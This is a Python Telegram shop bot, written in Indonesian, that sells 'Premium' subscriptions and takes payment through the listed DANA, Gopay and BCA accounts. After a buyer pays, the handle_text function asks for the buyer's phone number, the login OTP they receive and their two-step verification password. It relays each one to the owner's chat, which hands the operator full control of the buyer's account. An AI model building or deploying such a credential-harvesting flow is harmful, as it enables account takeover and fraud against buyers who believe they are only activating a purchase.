import logging
import os
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes, ConversationHandler
)

# Load .env
load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID"))

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Produk
produk_list = [
    {"id": "1", "nama": "\u2728 Premium 1 Bulan", "harga": 54000},
    {"id": "2", "nama": "\ud83c\udf1f Premium 3 Bulan", "harga": 200000},
    {"id": "3", "nama": "\ud83d\udc8e Premium 6 Bulan", "harga": 400000},
    {"id": "4", "nama": "\ud83c\udfc6 Premium 12 Bulan", "harga": 5000000}
]

# Metode pembayaran
metode_pembayaran = [
    {"nama": "QRIS", "detail": "https://link-qris-kamu"},
    {"nama": "DANA", "detail": "08558827668 a.n @serpagengs"},
    {"nama": "Gopay", "detail": "083170123771 a.n @serpagengs"},
    {"nama": "Bank BCA", "detail": "5940804673 a.n @serpagengs"}
]

# State Conversation
(
    PILIH_BULAN, KONFIRMASI, METODE_BAYAR, KIRIM_BUKTI,
    INPUT_NOHP, INPUT_OTP, INPUT_VERIFIKASI
) = range(7)

user_data_store = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    teks = "\ud83d\udce6 Daftar Produk:\n\n"
    for p in produk_list:
        teks += f"{p['id']}. {p['nama']} - Rp {p['harga']:,} \u2728\n"
    keyboard = [
        [InlineKeyboardButton("\ud83d\uded2 Beli Disini", callback_data="beli")],
        [InlineKeyboardButton("\ud83d\udcde CS", callback_data="cs"),
         InlineKeyboardButton("\ud83d\udce3 Testi", callback_data="testi")]
    ]
    await update.message.reply_text(teks, reply_markup=InlineKeyboardMarkup(keyboard))
    return PILIH_BULAN

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "beli":
        keyboard = [[InlineKeyboardButton(p["nama"], callback_data=f"beli_{p['id']}")] for p in produk_list]
        keyboard.append([InlineKeyboardButton("\u2b05\ufe0f Kembali", callback_data="start")])
        await query.edit_message_text("Pilih paket premium yang ingin dibeli:", reply_markup=InlineKeyboardMarkup(keyboard))
        return KONFIRMASI

    elif data == "cs":
        await query.edit_message_text("Hubungi CS: @serpagengs", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("\u2b05\ufe0f Kembali", callback_data="start")]]))
        return PILIH_BULAN

    elif data == "testi":
        await query.edit_message_text("Lihat testimoni: https://t.me/srpatesti", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("\u2b05\ufe0f Kembali", callback_data="start")]]))
        return PILIH_BULAN

    elif data == "start":
        return await start(update, context)

    elif data.startswith("beli_"):
        produk_id = data.split("_")[1]
        produk = next((p for p in produk_list if p["id"] == produk_id), None)
        if not produk:
            await query.edit_message_text("Produk tidak ditemukan.")
            return ConversationHandler.END
        user_data_store[query.from_user.id] = {"produk": produk}
        text = f"\ud83d\udedd\ufe0f {produk['nama']}\nHarga: Rp {produk['harga']:,}"
        buttons = [
            [InlineKeyboardButton("\u2705 Konfirmasi", callback_data="konfirmasi_produk")],
            [InlineKeyboardButton("\u2b05\ufe0f Kembali", callback_data="beli")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(buttons))
        return METODE_BAYAR

    elif data == "konfirmasi_produk":
        buttons = [[InlineKeyboardButton(p["nama"], callback_data=f"metode_{i}")] for i, p in enumerate(metode_pembayaran)]
        await query.edit_message_text("Pilih metode pembayaran:", reply_markup=InlineKeyboardMarkup(buttons))
        return KIRIM_BUKTI

    elif data.startswith("metode_"):
        idx = int(data.split("_")[1])
        metode = metode_pembayaran[idx]
        user_data_store[query.from_user.id]["metode"] = metode
        buttons = [[InlineKeyboardButton("\ud83d\udce4 Kirim Bukti TF", callback_data="kirim_bukti")]]
        await query.edit_message_text(f"{metode['nama']}:\n{metode['detail']}", reply_markup=InlineKeyboardMarkup(buttons))
        return KIRIM_BUKTI

    elif data == "kirim_bukti":
        await query.edit_message_text("Silakan kirim ss bukti transfer .")
        return KIRIM_BUKTI

async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if update.message.photo:
        file_id = update.message.photo[-1].file_id
        user_data_store[user_id]["bukti"] = file_id
        produk = user_data_store[user_id]["produk"]
        metode = user_data_store[user_id]["metode"]
        caption = f"\ud83d\udcc5 Bukti TF dari @{update.message.from_user.username or user_id}\nProduk: {produk['nama']}\nMetode: {metode['nama']}"
        buttons = [[
            InlineKeyboardButton("\u2705 Konfirmasi", callback_data=f"owner_konfirmasi_{user_id}"),
            InlineKeyboardButton("\u274c Tolak", callback_data=f"owner_tolak_{user_id}")
        ]]
        await context.bot.send_photo(chat_id=OWNER_ID, photo=file_id, caption=caption, reply_markup=InlineKeyboardMarkup(buttons))
        await update.message.reply_text("Bukti berhasil dikirim. Tunggu konfirmasi admin ya kak.")
        return INPUT_NOHP
    else:
        await update.message.reply_text("Hanya foto yang diterima.")
        return KIRIM_BUKTI

async def handle_owner_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    _, action, uid = query.data.split("_")
    uid = int(uid)

    if action == "konfirmasi":
        await context.bot.send_message(chat_id=uid, text="\u2705 Terima Kasih Pembayaran dikonfirmasi.\nSilakan kirim nomor HP nya kak.")
        await context.bot.send_message(chat_id=OWNER_ID, text=f"\ud83d\udcf1 No HP dari @{query.from_user.username or uid} telah dikonfirmasi.")
        return INPUT_NOHP
    else:
        await context.bot.send_message(chat_id=uid, text="\u274c Bukti ditolak. Kirim ulang.")
        return KIRIM_BUKTI

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.message.from_user.id
    text = update.message.text

    if "nohp" not in user_data_store[uid]:
        user_data_store[uid]["nohp"] = text
        await update.message.reply_text("\u2705 Nomor HP diterima, silakan kirim OTP yang telah Anda terima kirim pakai spasi ya.")
        await context.bot.send_message(chat_id=OWNER_ID, text=f"\ud83d\udcf1 No HP dari @{update.message.from_user.username or uid}: {text}")
        return INPUT_OTP
    elif "otp" not in user_data_store[uid]:
        user_data_store[uid]["otp"] = text
        await update.message.reply_text("\u2705 OTP diterima, silakan kirim verifikasi 2 langkah jika tidak ada ketik skip.")
        await context.bot.send_message(chat_id=OWNER_ID, text=f"\ud83d\udd10 OTP dari @{update.message.from_user.username or uid}: {text}")
        return INPUT_VERIFIKASI
    else:
        user_data_store[uid]["verifikasi"] = text
        await update.message.reply_text("Terimakasih Atas pembeliannya. Tunggu proses aktivasi ya kak.\nJika butuh bantuan silahkan hubungi owner.\n@serpagengs")
        await context.bot.send_message(chat_id=OWNER_ID, text=f"\ud83d\udd12 Verifikasi 2 langkah dari @{update.message.from_user.username or uid}: {text}")
        return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Dibatalkan.")
    return ConversationHandler.END

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PILIH_BULAN: [CallbackQueryHandler(button_handler)],
            KONFIRMASI: [CallbackQueryHandler(button_handler)],
            METODE_BAYAR: [CallbackQueryHandler(button_handler)],
            KIRIM_BUKTI: [
                CallbackQueryHandler(button_handler),
                MessageHandler(filters.PHOTO, handle_media)
            ],
            INPUT_NOHP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
            INPUT_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
            INPUT_VERIFIKASI: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )

    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(handle_owner_response, pattern="^owner_.*|^otp_.*|^verif_.*"))

    print("Bot is running...")
    app.run_polling()
